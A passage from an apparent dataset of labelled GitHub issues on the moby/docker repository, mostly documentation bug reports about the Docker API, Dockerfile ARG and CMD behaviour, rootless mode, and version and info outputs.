title?\n\nExample on contribution:\n![screen shot 2014-04-17 at 3 56 00 pm](https://cloud.githubusercontent.com/assets/521701/2737901/8a524fe0-c683-11e3-89a3-1fa97a2726d4.png)\n\n/cc @SvenDowideit @ostezer @jamtur01 \n"},{"labels":["documentation",null],"text":"While `docker logs` is extremely useful for inspecting containers, [the documentation gives no hints as to how it should be handled operationally](http://docs.docker.io/en/latest/reference/commandline/cli/#logs).\n\nOutstanding questions include:\n- Where are logs stored (or are they an inmemory ring buffer like dmesg)?\n- If they are stored, how are they rotated so they don't grow without bound?\n- Is it a best practice for daemons running in containers to _not_ using `std{out,err}` for logging (and instead use the host's syslog, a log file in a mounted voulme, a remote daemon, etc.)?\n\nAs per guidelines for contribution:\n\n```\nClient version: 0.9.1\nGo version (client): go1.2.1\nGit commit (client): 3600720\nServer version: 0.9.1\nGit commit (server): 3600720\nGo version (server): go1.2.1\nLast stable version: 0.9.1\n\nContainers: 3\nImages: 47\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Dirs: 57\nExecution Driver: native-0.1\nKernel Version: 3.11.0-18-generic\nWARNING: No swap limit support\n```\n\nI tried searching existing issues for duplicates, but logging is a very difficult thing to search on. Please feel free to close if this is a dupe.\n"},{"labels":[null,"documentation"],"text":"http://docs.docker.io/en/latest/reference/api/docker_remote_api_v1.10/#tag-an-image-into-a-repository\n\nDoesn't describe how to set the tag on the image...just allows you to provide the image repo.\n"},{"labels":["documentation",null,null],"text":"I was using the following\n\nENV MYPATH /usr/local/myPath\nCMD [ \"ls\", \"-la\", \"$MYPATH\"]\n\nand I get \nls: cannot access $MYPATH: No such file or directory\n\nBut, if I used the other format\nCMD ls -la $MYPATH\n\nthen the listing is correct.\n\nCMD [ \"ls\", \"-la\", $NMMHOME ] simply doesn't work\n\nNow I also was trying something like this.\n\nENTRYPOINT [ \"$MYPATH/start.sh\"]\n\ndoesn't work. Some problem : unable to locate $MYPATH/start.sh\n\nBut similarly to CMD 'shell version'\n\nENTRYPOINT $MYPATH/start.sh\n\nworks fine.\n\nAlso the start.sh is referencing the $MYPATH as well and it sees the correct value.\n\nSo I think there is still a bug in specifying the environment variables within the CMD / ENTRYPOINT commands when using the exec like way (preferred method)\n"},{"labels":["documentation",null],"text":"**Description**\r\nI was visiting https://mobyproject.org/ and when I clicked github link it redirected to 404 Page Not found.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Go to https://mobyproject.org/\r\n2.Click on Github Link\r\n\r\n**Describe the results you received:**\r\nIt redirected to `https://github.com/moby/moby/blob/moby/README.md` \r\n\r\n**Describe the results you expected:**\r\nI think it should be `https://github.com/moby/moby/` or to README page `https://github.com/moby/moby/blob/master/README.md`\r\n"},{"labels":[null,"documentation",null,null],"text":"**Description**\r\n\r\nThe SwarmJoin API supports `Availability` (https://github.com/moby/moby/blob/master/daemon/cluster/swarm.go#L147-L188), which the CLI client also uses, but it is not documented in the API docs (https://github.com/moby/moby/blob/master/api/swagger.yaml#L10008).\r\n"},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nsystemd is not recognized. There seems to be some relation to the login method [see stack exchange question & answer](https://unix.stackexchange.com/questions/587674/systemd-not-detected-dockerd-daemon-needs-to-be-started-manually)\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. Open [Docker Rootless Tutorial on Katacoda](https://www.katacoda.com/courses/docker/rootless)\r\n2. Execute every command in the turorial\r\n\r\n\r\n**Describe the results you received:**\r\n\r\nreceive the warnings \r\n```\r\nsystemd is not detected, dockerd daemon needs to be started manually\r\n...\r\n#WARN: systemd not found. You have to remove XDG_RUNTIME_DIR manually on every logout\r\n``` \r\nand watch the first command in step 3 fail with\r\n![image](https://user-images.githubusercontent.com/29106652/91537131-17702800-e916-11ea-9454-aa7eaa9d7eec.png)\r\n\r\n**Describe the results you expected:**\r\nA tutorial [suggested by the maintainer of the project](https://youtu.be/Qq78zfXUq18?t=659) should work. Especially since it is identical to the tutorial on https://docs.docker.com/engine/security/rootless/ which also results in these warnings on my machine.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n![image](https://user-images.githubusercontent.com/29106652/91537740-14296c00-e917-11ea-8559-128c79e19036.png)\r\n\r\n\r\n**Output of `docker info`:**\r\n![image](https://user-images.githubusercontent.com/29106652/91537683-fd831500-e916-11ea-80f4-e77ba371dbae.png)\r\n\r\n\r\nI barely even understand what systemd does. So I really have no idea what is happening. If you have suggestions how to get this working it would be greatly appreciated.\r\n"},{"labels":[null,"documentation",null],"text":"**Description**\r\n\r\nThe documentation does not AFAIK mention that environment would take precedence over command line arguments, which is AFAIK not conventional.\r\n\r\nOnly mention is this [1]\r\n\r\n> You can also set the current context using the DOCKER_CONTEXT environment variable. This overrides the context set with docker context use.\r\n\r\n[1] https://docs.docker.com/engine/context/working-with-contexts/#use-a-different-context\r\n\r\n**Steps to reproduce the issue:**\r\n\r\n```bash\r\n  ~ ls test\r\nDockerfile\r\n➜  ~ DOCKER_CONTEXT=/dev/null docker build ./test\r\nunable to resolve docker endpoint: context \"/dev/null\" does not exist\r\n```\r\n\r\n**Describe the results you received:**\r\n\r\nEnvironment is read instead of the positional `PATH`\r\n\r\n**Describe the results you expected:**\r\n\r\nCommand line is read.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\nn/a\r\n\r\n**Output of `docker version`:**\r\n\r\nn/a - happens on all version I tried\r\n\r\n**Output of `docker info`:**\r\n\r\nn/a - happens on multiple systems\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nalso n/a"},{"labels":["documentation"],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nIn the OpenAPI documentation for the SystemDataUsage operation, the response schema describes a BuildCache as having properties CreatedAt and LastUsedAt of type integer. However, in the code types.BuildCache is defined as having properties CreatedAt and LastUsedAt of type time.time, and when a time.time value is passed to json.Encoder the type emitted in the JSON document is a RFC 3339 string because of time.time's MarshalJSON implementation.\r\n\r\nThis causes problems for anyone who is using the API documentation to autogenerate API clients.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Run builds using BuildKit.\r\n2. Request SystemDataUsage via the API.\r\n\r\n**Describe the results you received:**\r\n\r\n    {\r\n      \"ID\": \"rrc3gr2ks5mm41ntmlqsqu2k4\",\r\n      \"Parent\": \"2tub3atjmssqqh0ji08jjc5oj\",\r\n      \"Type\": \"regular\",\r\n      \"Description\": \"fileop target\",\r\n      \"InUse\": false,\r\n      \"Shared\": false,\r\n      \"Size\": 353,\r\n      \"CreatedAt\": \"2020-06-17T14:55:03.5952988Z\",\r\n      \"LastUsedAt\": \"2020-06-17T14:55:44.6490503Z\",\r\n      \"UsageCount\": 1\r\n    }\r\n\r\nThis causes [Bollard](https://github.com/fussybeaver/bollard) to return a parse error because the CreatedAt property is found, but cannot be converted to an integer for storage into the struct.\r\n\r\n**Describe the results you expected:**\r\n\r\nEither CreatedAt and LastUsedAt should be integers, or the API specification should define these properties as strings (or being possibly being either type?).\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\n$ docker version\r\nClient: Docker Engine - Community\r\n Version:           19.03.8\r\n API version:       1.40\r\n Go version:        go1.12.17\r\n Git commit:        afacb8b\r\n Built:             Wed Mar 11 01:21:11 2020\r\n OS/Arch:           darwin/amd64\r\n Experimental:      false\r\n\r\nServer: Docker Engine - Community\r\n Engine:\r\n  Version:          19.03.8\r\n  API version:      1.40 (minimum version 1.12)\r\n  Go version:       go1.12.17\r\n  Git commit:       afacb8b\r\n  Built:            Wed Mar 11 01:29:16 2020\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n containerd:\r\n  Version:          v1.2.13\r\n  GitCommit:        7ad184331fa3e55e52b890ea95e65ba581ae3429\r\n runc:\r\n  Version:          1.0.0-rc10\r\n  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd\r\n docker-init:\r\n  Version:          0.18.0\r\n  GitCommit:        fec3683\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\nI don't have the output of docker info because this issue was originally found by @mac-chaffee and raised as stepchowfun/docuum#78.\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n"},{"labels":[null,"documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\nIn api document `/version` response looks like wrong.\r\nhttps://github.com/moby/moby/blob/master/docs/api/v1.40.yaml#L7715\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. `curl --unix-socket /var/run/docker.sock localhost/version`\r\n\r\n**Describe the results you received:**\r\n```\r\n{\r\n  \"Platform\": {\r\n    \"Name\": \"Docker Engine - Community\"\r\n  },\r\n  \"Components\": [\r\n    {\r\n      \"Name\": \"Engine\",\r\n      \"Version\": \"19.03.12\",\r\n      \"Details\": {\r\n        \"ApiVersion\": \"1.40\",\r\n        \"Arch\": \"amd64\",\r\n        \"BuildTime\": \"2020-06-22T15:44:07.000000000+00:00\",\r\n        \"Experimental\": \"false\",\r\n        \"GitCommit\": \"48a66213fe\",\r\n        \"GoVersion\": \"go1.13.10\",\r\n        \"KernelVersion\": \"5.3.0-62-generic\",\r\n        \"MinAPIVersion\": \"1.12\",\r\n        \"Os\": \"linux\"\r\n      }\r\n    },\r\n    ...\r\n  ],\r\n  \"Version\": \"19.03.12\",\r\n  \"ApiVersion\": \"1.40\",\r\n  \"MinAPIVersion\": \"1.12\",\r\n  \"GitCommit\": \"48a66213fe\",\r\n  \"GoVersion\": \"go1.13.10\",\r\n  \"Os\": \"linux\",\r\n  \"Arch\": \"amd64\",\r\n  \"KernelVersion\": \"5.3.0-62-generic\",\r\n  \"BuildTime\": \"2020-06-22T15:44:07.000000000+00:00\"\r\n}\r\n```\r\n\r\n**Describe the results you expected:**\r\nLooks like document is wrong.\r\nWe should update document?\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient: Docker Engine - Community\r\n Version:           19.03.12\r\n API version:       1.40\r\n Go version:        go1.13.10\r\n Git commit:        48a66213fe\r\n Built:             Mon Jun 22 15:45:36 2020\r\n OS/Arch:           linux/amd64\r\n Experimental:      false\r\n\r\nServer: Docker Engine - Community\r\n Engine:\r\n  Version:          19.03.12\r\n  API version:      1.40 (minimum version 1.12)\r\n  Go version:       go1.13.10\r\n  Git commit:       48a66213fe\r\n  Built:            Mon Jun 22 15:44:07 2020\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n containerd:\r\n  Version:          1.2.13\r\n  GitCommit:        7ad184331fa3e55e52b890ea95e65ba581ae3429\r\n runc:\r\n  Version:          1.0.0-rc10\r\n  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd\r\n docker-init:\r\n  Version:          0.18.0\r\n  GitCommit:        fec3683\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nClient: Docker Engine - Community\r\n Version:           19.03.12\r\n API version:       1.40\r\n Go version:        go1.13.10\r\n Git commit:        48a66213fe\r\n Built:             Mon Jun 22 15:45:36 2020\r\n OS/Arch:           linux/amd64\r\n Experimental:      false\r\n\r\nServer: Docker Engine - Community\r\n Engine:\r\n  Version:          19.03.12\r\n  API version:      1.40 (minimum version 1.12)\r\n  Go version:       go1.13.10\r\n  Git commit:       48a66213fe\r\n  Built:            Mon Jun 22 15:44:07 2020\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n containerd:\r\n  Version:          1.2.13\r\n  GitCommit:        7ad184331fa3e55e52b890ea95e65ba581ae3429\r\n runc:\r\n  Version:          1.0.0-rc10\r\n  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd\r\n docker-init:\r\n  Version:          0.18.0\r\n  GitCommit:        fec3683\r\n[I] docker.vim )\r\n[I] docker.vim ) docker info\r\nClient:\r\n Debug Mode: false\r\n\r\nServer:\r\n Containers: 2\r\n  Running: 1\r\n  Paused: 0\r\n  Stopped: 1\r\n Images: 52\r\n Server Version: 19.03.12\r\n Storage Driver: overlay2\r\n  Backing Filesystem: extfs\r\n  Supports d_type: true\r\n  Native Overlay Diff: true\r\n Logging Driver: json-file\r\n Cgroup Driver: cgroupfs\r\n Plugins:\r\n  Volume: local\r\n  Network: bridge host ipvlan macvlan null overlay\r\n  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog\r\n Swarm: inactive\r\n Runtimes: runc\r\n Default Runtime: runc\r\n Init Binary: docker-init\r\n containerd version: 7ad184331fa3e55e52b890ea95e65ba581ae3429\r\n runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd\r\n init version: fec3683\r\n Security Options:\r\n  apparmor\r\n  seccomp\r\n   Profile: default\r\n Kernel Version: 5.3.0-62-generic\r\n Operating System: Ubuntu 18.04.4 LTS\r\n OSType: linux\r\n Architecture: x86_64\r\n CPUs: 8\r\n Total Memory: 31.09GiB\r\n Name: thinkpad\r\n ID: EKKH:UC2C:RDMA:JDP2:KDIG:GW2W:T2H3:S3LT:MWNI:D5YG:X24P:K2DC\r\n Docker Root Dir: /var/lib/docker\r\n Debug Mode: false\r\n Username: skanehira\r\n Registry: https://index.docker.io/v1/\r\n Labels:\r\n Experimental: false\r\n Insecure Registries:\r\n  127.0.0.0/8\r\n Live Restore Enabled: false\r\n\r\nWARNING: No swap limit support\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nOS: Ubuntu 18.04.01"},{"labels":["documentation",null,null,null],"text":"**Description**\r\n\r\nI don't find anywhere any resource to raise ulimits with Docker Rootless. The documentation is [way too limited about it](https://docs.docker.com/engine/security/rootless/#limiting-resources) :\r\n\r\n> However, traditional ulimit and cpulimit can be still used, though they work in process-granularity rather than in container-granularity.\r\n\r\nI've edited my local limits (`/etc/security/limits.conf`) so my user has these ulimits : \r\n\r\n```\r\nopen files                  (-n) 40000\r\nmax user processes              (-u) 40000\r\n```\r\n\r\nMy daemon is automatically started by my `systemctl --user` service.\r\n\r\nWhen I run `docker run -it --rm ubuntu bash -c \"ulimit -n\"`, I get : `4096`\r\n\r\nWhat is very interesting is when I manually run the docker daemon (I stop the systemctl service, then run) : \r\n\r\n```console\r\n/home/myuser/bin/dockerd-rootless.sh --experimental --storage-driver=overlay2\r\n```\r\n\r\nAnd that I run `docker run -it --rm ubuntu bash -c \"ulimit -n\"`, I get : `40000`\r\n\r\n**So I don't know what is going on ! Why is my daemon loaded by systemctl ignoring my user ulimits ?**\r\n\r\nHere is my `~/.config/systemd/user/docker.service` file : \r\n\r\n```\r\n[Unit]\r\nDescription=Docker Application Container Engine (Rootless)\r\nDocumentation=https://docs.docker.com\r\n\r\n[Service]\r\nEnvironment=PATH=/home/myuser/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r\nExecStart=/home/myuser/bin/dockerd-rootless.sh --experimental --storage-driver=overlay2\r\nExecReload=/bin/kill -s HUP $MAINPID\r\nTimeoutSec=0\r\nRestartSec=2\r\nRestart=always\r\nStartLimitBurst=3\r\nStartLimitInterval=20s\r\nLimitNOFILE=infinity\r\nLimitNPROC=infinity\r\nLimitCORE=infinity\r\nTasksMax=infinity\r\nDelegate=yes\r\nType=simple\r\n\r\n[Install]\r\nWantedBy=default.target\r\n```\r\n\r\n<details><summary>Docker Info</summary>\r\n<p>\r\n\r\n```\r\nClient:\r\n Debug Mode: false\r\n\r\nServer:\r\n Containers: 0\r\n  Running: 0\r\n  Paused: 0\r\n  Stopped: 0\r\n Images: 2\r\n Server Version: 19.03.8\r\n Storage Driver: vfs\r\n Logging Driver: json-file\r\n Cgroup Driver: none\r\n Plugins:\r\n  Volume: local\r\n  Network: bridge host ipvlan macvlan null overlay\r\n  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog\r\n Swarm: inactive\r\n Runtimes: runc\r\n Default Runtime: runc\r\n Init Binary: docker-init\r\n containerd version: 7ad184331fa3e55e52b890ea95e65ba581ae3429\r\n runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd\r\n init version: fec3683\r\n Security Options:\r\n  seccomp\r\n   Profile: default\r\n  rootless\r\n Kernel Version: 4.15.0-99-generic\r\n Operating System: Ubuntu 18.04.2 LTS\r\n OSType: linux\r\n Architecture: x86_64\r\n CPUs: 3\r\n Total Memory: 3.849GiB\r\n Name: somelinux\r\n ID: CHQ7:K7CT:QQ7H:NKAD:PCYY:G4HK:HY7K:WLRU:CIGY:C6PD:CO6J:XKZ2\r\n Docker Root Dir: /home/dfob/.local/share/docker\r\n Debug Mode: false\r\n Registry: https://index.docker.io/v1/\r\n Labels:\r\n Experimental: true\r\n Insecure Registries:\r\n  127.0.0.0/8\r\n Live Restore Enabled: false\r\n Product License: Community Engine\r\n\r\nWARNING: No swap limit support\r\nWARNING: bridge-nf-call-iptables is disabled\r\nWARNING: bridge-nf-call-ip6tables is disabled\r\n```\r\n\r\n</p>\r\n</details>\r\n\r\nThank you"},{"labels":[null,"documentation"],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\nWhen using ARG to specify an image or tag in a multi-stage Dockerfile, the ARG is not being applied correctly.\r\n\r\nThis is a simplified version of my Dockerfile which does not work:\r\n```\r\nFROM scratch\r\n\r\nARG node_version\r\n\r\nFROM node:${node_version}-alpine\r\n```\r\n\r\nThis example does work, but should not according to how I understand ARG to work:\r\n```\r\nARG node_version\r\n\r\nFROM scratch\r\n\r\nARG node_version=${node_version}\r\n\r\nFROM node:${node_version}-alpine\r\n```\r\n\r\nThis example also works:\r\n```\r\nARG node_version\r\n\r\nFROM node:${node_version}-alpine\r\n```\r\n\r\nThis leads to believe that there is a mishandling of the variables in multi-stage builds.\r\n\r\n**Steps to reproduce the issue:**\r\n1. run \"docker build . --build-arg=node_version=12.14.1\" with the Dockerfile above.\r\n\r\n**Describe the results you received:**\r\nDocker reports:\r\n```\r\nStep 3/3 : FROM node:${node_version}-alpine\r\ninvalid reference format\r\n```\r\n\r\n**Describe the results you expected:**\r\nI expect to be able to use a variable defined by ARG before the FROM in the FROM statement itself, even in multi-stage builds.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n```\r\nDocker version 19.03.8, build afacb8b\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nClient:\r\n Debug Mode: false\r\n\r\nServer:\r\n Containers: 24\r\n  Running: 20\r\n  Paused: 0\r\n  Stopped: 4\r\n Images: 19\r\n Server Version: 19.03.8\r\n Storage Driver: overlay2\r\n  Backing Filesystem: <unknown>\r\n  Supports d_type: true\r\n  Native Overlay Diff: true\r\n Logging Driver: json-file\r\n Cgroup Driver: cgroupfs\r\n Plugins:\r\n  Volume: local\r\n  Network: bridge host ipvlan macvlan null overlay\r\n  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog\r\n Swarm: inactive\r\n Runtimes: runc\r\n Default Runtime: runc\r\n Init Binary: docker-init\r\n containerd version: 7ad184331fa3e55e52b890ea95e65ba581ae3429\r\n runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd\r\n init version: fec3683\r\n Security Options:\r\n  seccomp\r\n   Profile: default\r\n Kernel Version: 4.19.76-linuxkit\r\n Operating System: Docker Desktop\r\n OSType: linux\r\n Architecture: x86_64\r\n CPUs: 2\r\n Total Memory: 1.943GiB\r\n Name: docker-desktop\r\n ID: AAU3:FDX7:NZ7A:MCNC:L5DC:NGLG:XMFS:NVNO:WPW3:OJKH:6YSQ:6JMR\r\n Docker Root Dir: /var/lib/docker\r\n Debug Mode: true\r\n  File Descriptors: 142\r\n  Goroutines: 134\r\n  System Time: 2020-04-16T16:20:01.016176142Z\r\n  EventsListeners: 3\r\n Registry: https://index.docker.io/v1/\r\n Labels:\r\n Experimental: false\r\n Insecure Registries:\r\n  127.0.0.0/8\r\n Live Restore Enabled: false\r\n Product License: Community Engine\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nThis is reproducible under Google Cloud Builder when using the standard Docker build image here: gcr.io/cloud-builders/docker."},{"labels":["documentation",null],"text":"**Description**\r\nAccording to commit https://github.com/moby/moby/commit/32915b1d0a315598edb737785d0357b5a1b8aa11, we can no longer build `binary-client` by running `./hack/make.sh binary-client`.\r\nThe document could be updated."},{"labels":[null,"documentation",null,null],"text":"I noticed that we still have some old release branches in this repository. Some of those branches have changes that never made it into a release (or documentation cherry-picks that were published in the documentation, but not tagged as a release)\r\n\r\n\r\nBranch                                               | Changes not in a release\r\n-----------------------------------------------------|--------------------------------------------------------------\r\n[1.12.x](https://github.com/moby/moby/tree/1.12.x)   | https://github.com/moby/moby/compare/v1.12.6...1.12.x\r\n[1.13.x](https://github.com/moby/moby/tree/1.13.x)   | https://github.com/moby/moby/compare/v1.13.1...1.13.x\r\n[17.03.x](https://github.com/moby/moby/tree/17.03.x) | https://github.com/moby/moby/compare/v17.03.2-ce...17.03.x\r\n[17.04.x](https://github.com/moby/moby/tree/17.04.x) | https://github.com/moby/moby/compare/v17.04.0-ce...17.04.x\r\n[17.05.x](https://github.com/moby/moby/tree/17.05.x) | https://github.com/moby/moby/compare/v17.05.0-ce...17.05.x (no diff)\r\n[docs](https://github.com/moby/moby/tree/docs)       | documentation-only changes\r\n\r\n\r\nSome care should be taken when removing these branches, because the docker documentation fetches some resources from some of these branches; https://github.com/docker/docker.github.io/blob/ec57364ede82a135021e2e762bd0833d92a0cc0f/_scripts/fetch-upstream-resources.sh#L74 https://github.com/docker/docker.github.io/blob/ec57364ede82a135021e2e762bd0833d92a0cc0f/_scripts/fetch-upstream-resources.sh#L89-L95\r\n\r\n\r\nIn addition, with the introduction of the Swagger file (which is used to document current versions of the API), this repository only has a definition of the _current_ version of the API. Older versions of the API need to be fetched from either tags in various repositories, or from release-branches in those repositories. Having those files spread in various locations makes building the docs complicated, but also makes it more difficult to _compare_ changes between API versions, or to make fixes to the API documentation (if there's a bug or missing documentation in existing API versions).\r\n\r\nI'm planning to add copies of the swagger.yml for each API version. in this repository to address that.\r\n\r\n- [x] update docker-ce-packaging to build from upstream repositories instead of the mono-repo; https://github.com/docker/docker-ce-packaging/pull/449\r\n    - note: more changes needed in the private release packaging repositories, but those are tracked separately\r\n- [x] update fetch-upstream-resources.sh script in documentation repository to not depend on these branches (https://github.com/docker/docker.github.io/pull/10101)\r\n    - [x] https://github.com/docker/docker.github.io/pull/10343 Engine API: use template for API reference pages\r\n    - [x] https://github.com/docker/docker.github.io/pull/10348 Simplify use of \"ENGINE_BRANCH\" and \"DISTRIBUTION_BRANCH\"\r\n    - [x] https://github.com/docker/docker.github.io/pull/10344 [WIP] simplify fetching API versions\r\n    - [x] https://github.com/docker/docker.github.io/pull/10578 Engine API: remove per-branch fetching of API docs\r\n- [x] backport fetch-upstream-resources.sh changes to documentation archive branches\r\n    - [x] v18.09 archive branch https://github.com/docker/docker.github.io/pull/10196\r\n    - [x] v18.03 archive branch https://github.com/docker/docker.github.io/pull/10349\r\n    - [x] ~v17.12 archive branch~ won't fix\r\n    - [x] ~v17.09 archive branch~ won't fix\r\n    - [x] ~v17.06 archive branch~ won't fix\r\n    - [x] ~v17.03 archive branch~ won't fix\r\n    - [x] ~v1.13 archive branch~ won't fix\r\n- [x] add a copy of the swagger.yml for each released version of the API\r\n    - [x] v1.40 - docker v19.03 https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.39 - docker v18.09 https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.38 - docker v18.06 https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.37 - docker v18.03 - v18.05 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.36 - docker v18.02 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.35 - docker v17.12 - v18.01 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.34 - docker v17.11 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.33 - docker v17.10 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.32 - docker v17.09 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.31 - docker v17.07 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.30 - docker v17.06 https://github.com/moby/moby/pull/40778\r\n    - [x] v1.29 - docker v17.05 https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.28 - docker v17.04 